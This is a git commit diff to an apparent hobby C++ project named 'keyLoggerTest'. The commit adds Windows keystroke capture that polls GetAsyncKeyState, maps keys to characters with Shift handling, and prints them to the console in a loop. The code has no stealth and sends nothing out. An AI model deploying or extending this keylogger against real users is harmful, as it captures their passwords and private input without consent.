0c7f4d74d00db1af029d89ef9da3e7ccd84e9451
Tomer <tomershush@gmail.com>
2023-01-25 22:02:08 +0200

    Added logging ability for all printable characters

--- keyLoggerTest/keyLogger/main.cpp
+++ keyLoggerTest/keyLogger/main.cpp
@@ -3,6 +3,8 @@
 #include <Windows.h>
 
 #define NUM_OF_KEYS 255
+#define LOWEST_PRINTABLE '!'
+#define HIGHEST_PRINTABLE '~'
 
 /*
 HHOOK hkb;
@@ -31,21 +33,138 @@ BOOL installhook()
 }
 */
 
-int keyWasPressed()
+
+
+
+int checkShiftChars()
 {
-    int stat = 0;
+    if (GetAsyncKeyState(VK_SHIFT))
+        return TRUE;
+
+    return FALSE;
+}
+
+char formatShiftedKeys(char keyChar)
+{
+    char shiftedChar = keyChar;
+
+    switch (keyChar)
+    {
+    case '0':
+        shiftedChar = ')';
+        break;
+    case '1':
+        shiftedChar = '!';
+        break;
+    case '2':
+        shiftedChar = '@';
+        break;
+    case '3':
+        shiftedChar = '#';
+        break;
+    case '4':
+        shiftedChar = '$';
+        break;
+    case '5':
+        shiftedChar = '%';
+        break;
+    case '6':
+        shiftedChar = '^';
+        break;
+    case '7':
+        shiftedChar = '&';
+        break;
+    case '8':
+        shiftedChar = '*';
+        break;
+    case '9':
+        shiftedChar = '(';
+        break;
+    case '-':
+        shiftedChar = '_';
+        break;
+    case '=':
+        shiftedChar = '+';
+        break;
+    case '`':
+        shiftedChar = '~';
+        break;
+    case ';':
+        shiftedChar = ':';
+        break;
+    case '\'':
+        shiftedChar = '\"';
+        break;
+    case ',':
+        shiftedChar = '<';
+        break;
+    case '.':
+        shiftedChar = '>';
+        break;
+    case '/':
+        shiftedChar = '?';
+        break;
+    case '[':
+        shiftedChar = '{';
+        break;
+    case ']':
+        shiftedChar = '}';
+        break;
+        
+
+    default:
+        break;
+
+    }
+
+    return shiftedChar;
+}
+
+char filterPrintable(char keyChar)
+{
+    if (keyChar >= LOWEST_PRINTABLE && keyChar <= HIGHEST_PRINTABLE)
+        return keyChar;
+
+    return 0;
+}
+
+char convertToLowerCase(char letter)
+{
+    return letter + 32;
+}
+
+/*
+A function that checks if any key was pressed on the keyboard, except for the Shift keys.
+(They have a special use)
+*/
+char keyWasPressed()
+{
+    int keyStat = 0;
+    char keyChar = 0;
 
     for (int i = 0; i < NUM_OF_KEYS; i++)
     {
-        if (GetAsyncKeyState(i) & 0x1)
+        keyStat = GetAsyncKeyState(i);
+
+        if ((keyStat & 0x1) && GetAsyncKeyState(VK_SHIFT) && i != VK_SHIFT && i != VK_RSHIFT && i != VK_LSHIFT)
         {
-            stat = i;
+            keyChar = filterPrintable((char)MapVirtualKey(i, MAPVK_VK_TO_CHAR));
+            keyChar = formatShiftedKeys(keyChar);
             i = NUM_OF_KEYS;
         }
-          
+        else if (keyStat & 0x1)
+        {
+            keyChar = filterPrintable((char)MapVirtualKey(i, MAPVK_VK_TO_CHAR));
+
+            if (keyChar >= 'A' && keyChar <= 'Z')
+                keyChar = convertToLowerCase(keyChar);
+
+            i = NUM_OF_KEYS;
+        }
+
     }
 
-    return stat;
+    return keyChar;
 }
 
 int main()
@@ -64,12 +183,14 @@ int main()
     UnhookWindowsHookEx(hkb);
 
     std::cout << "Done!\n";
-    */ 
+    */
+    MSG msg;
     while(TRUE)
     {
 
-        std::cout << (char) MapVirtualKey(keyWasPressed(), MAPVK_VK_TO_CHAR);
+        std::cout << keyWasPressed();
         Sleep(120);
+        
     }
     
 	return 0;
